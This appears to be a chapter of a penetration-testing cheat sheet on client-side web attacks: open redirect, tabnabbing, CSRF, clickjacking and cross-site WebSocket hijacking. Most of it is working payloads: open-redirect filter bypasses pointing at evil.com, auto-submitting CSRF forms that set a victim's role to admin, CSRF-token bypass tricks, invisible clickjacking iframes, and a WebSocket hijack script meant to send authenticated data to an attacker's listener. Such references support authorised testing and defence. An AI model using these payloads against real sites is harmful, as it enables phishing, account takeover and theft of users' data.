# Ch12 — Open Redirect, Tabnabbing, CSRF, Clickjacking & WebSocket Abuse

> Client-side cross-site families: redirect params & filter bypasses, CSRF PoC forms per content-type, frame-busting evasion, tabnabbing, cross-site WebSocket hijacking.
> Sources: `Open Redirect/`, `Cross-Site Request Forgery/`, `Clickjacking/`, `Tabnabbing/`, `Web Sockets/`.

**Route here when**: `?url=`/`?next=`/`?redirect=`/`?return=` params control navigation; state-changing endpoints lack CSRF tokens; pages are frameable (no X-Frame-Options/CSP frame-ancestors); links open `_blank` without `noopener`; WebSocket endpoints trust Origin.

## Open redirect — parameter names

```powershell
?checkout_url= ?continue= ?dest= ?destination= ?go= ?image_url=
?next= ?redir= ?redirect_uri= ?redirect_url= ?redirect= ?return_path=
?return_to= ?return= ?returnTo= ?rurl= ?target= ?url= ?view=
/{payload}  /redirect/{payload}                          // path-based redirects
```

JS-driven sinks: `?redirectTo=`/`window.location`/`location.hash`-derived — check for `var redirectTo = "..."` patterns.

## Open redirect — filter bypass families

```powershell
//evil.com                                // scheme-relative
////evil.com  \/evil.com  /\/evil.com     // slash variants
https:evil.com                            // missing slashes
//whitelisted.com.evil.com                // suffix trick on allowlist
//evil.com%00.whitelisted.com             // null byte
?next=whitelisted.com&next=evil.com       // HPP — validator reads first, redirector reads last
//evil.com%E3%80%82com → //evil。com       // ideographic full stop (。) = dot
java%0d%0ascript%0d%0a:alert(0)           // CRLF inside javascript: scheme
//user:pass@evil.com                      // userinfo: http://www.theirsite.com@yoursite.com/
http://allowed.com?http://evil.com/       // ? translation tricks
http://allowed.com/folder/evil.com        // path-as-host confusion
https://evil.c℀.allowed.com              // unicode host-split (℀ → a/c normalization)
http://a.com／X.b.com                     // fullwidth slash normalization
```

Match the bypass to the validator: blacklist-word checks → encoding/CRLF; allowlist domain checks → suffix/userinfo/subdomain tricks; `starts_with` checks → `allowed.com.evil.com`; parser differentials → `\`, `#`, `@`, unicode normalization (HostSplit).

Redirect status codes worth knowing: 301/302/303/305/307/308 — 307/308 preserve method+body (useful when a POST endpoint redirects), 301/303 drop to GET.

## Tabnabbing

`<a href="..." target="_blank">` without `rel="noopener"` → the opened page's `window.opener` points back:

```js
window.opener.location = "http://phishing.example";
```

Plant a link in user-content (comments, profiles); the background tab silently navigates to a credential lookalike. Detect: grep for `target="_blank"` lacking `noopener`/`noreferrer`.

## CSRF — PoC payload per transport

Mechanism: victim's browser attaches session cookies to a request the app can't distinguish from a real one. Choose the form by the endpoint's accepted content-type.

**GET, user interaction**:

```html
<a href="http://example.com/api/setusername?username=CSRFd">Click Me</a>
```

**GET, zero-click**:

```html
<img src="http://example.com/api/setusername?username=CSRFd">
```

**POST form, click**:

```html
<form action="http://example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="Submit" />
</form>
```

**POST autosubmit, zero-click**:

```html
<form id="autosubmit" action="http://example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
</form>
<script>document.getElementById("autosubmit").submit();</script>
```

**POST multipart file** (endpoint expects a file field):

```html
<script>
function launch(){
    const dT = new DataTransfer();
    const file = new File(["content"], "filename");
    dT.items.add(file);
    document.f[0].files = dT.files;
    document.f.submit()
}
</script>
<form style="display:none" name="f" method="post" action="TARGET" enctype="multipart/form-data">
<input id="file" type="file" name="file"/><input type="submit" size="0"/>
</form>
<button onclick="launch()">Submit</button>
```

**JSON body, simple-request trick**: `application/json` isn't a CORS-safelisted type — use `text/plain` or the name/value JSON-in-field trick:

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://example.com/api/setrole");
xhr.setRequestHeader("Content-Type", "text/plain");
xhr.send('{"role":"admin"}');            // many frameworks still parse body as JSON
</script>
```

```html
<form action="http://example.com/api/setrole" enctype="text/plain" method="POST">
 <input type="hidden" name='{"role":"admin","pad":"'  value='"}' />
</form>
<script>document.forms[0].submit()</script>
<!-- sends: {"role":"admin","pad":"="} -->
```

**Full XHR (needs CORS to read response — works anyway for state change)**:

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://example.com/api/setrole");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhr.send('{"role":"admin"}');
</script>
```

## CSRF token/defense bypasses

| Defense | Bypass to try |
|---|---|
| Token checked only when present | drop the `csrf` param entirely |
| Token checked on POST only | switch to GET (`?csrf=` removed) |
| Token not bound to session | use a token from YOUR account for victim's request |
| Token in cookie + param (double submit) | set the cookie via CRLF/subdomain, or the app accepts any value |
| Referer/Origin check only when present | `<meta name="referrer" content="never">` on the attack page strips it |
| Referer substring check | `https://victim.com.attacker.tld/` or `attacker.tld/?victim.com` |
| SameSite=Lax cookie | GET-based CSRF still sends it; also try top-level GET navigations, `<form method=GET>` |
| SameSite=Strict | chain through an open redirect or client-side path on the same site |

## Clickjacking

Page lacks `X-Frame-Options`/`frame-ancestors` → iframe it and trick a click:

```html
<iframe src="https://victim/settings" style="opacity:0;position:absolute;top:0;left:0;height:100%;width:100%;border:none"></iframe>
```

UI-redress overlay (transparent element over the real page):

```html
<div style="opacity:0;position:absolute;top:0;left:0;height:100%;width:100%;">
  <a href="malicious-link">Click me</a>
</div>
```

Drag-and-drop / multi-click variants target forms; the PoC only needs to show the victim page framing inside your page (screenshot it) — don't actually drive state changes on production.

Frame-buster evasions: `X-Frame-Options: ALLOW-FROM` removed → rely on CSP `frame-ancestors`; `<iframe sandbox>` strips scripts that try to bust out (`allow-scripts` omitted); `onBeforeUnload` spam tricks and IE8-era `XSS-Protection` toggles are legacy — test `frame-ancestors` presence instead.

## Cross-site WebSocket hijacking (CSWSH)

`new WebSocket('wss://target/ws')` ignores CORS — if the WS handshake relies on cookies and doesn't check `Origin`, a victim's browser opens an authenticated socket from your page:

```html
<script>
var ws = new WebSocket("wss://target/ws");
ws.onmessage = function(e){ /* e.data has authenticated content → send to your listener */ };
ws.onopen = function(){ ws.send('{"action":"readSecret"}') };
</script>
```

Also try: `Origin:` swap on the handshake request (any value accepted = finding), token-in-URL leaks, message-injection (`{"action":"adminOp"}`), CSWSH→state-change (send messages that trigger server actions).
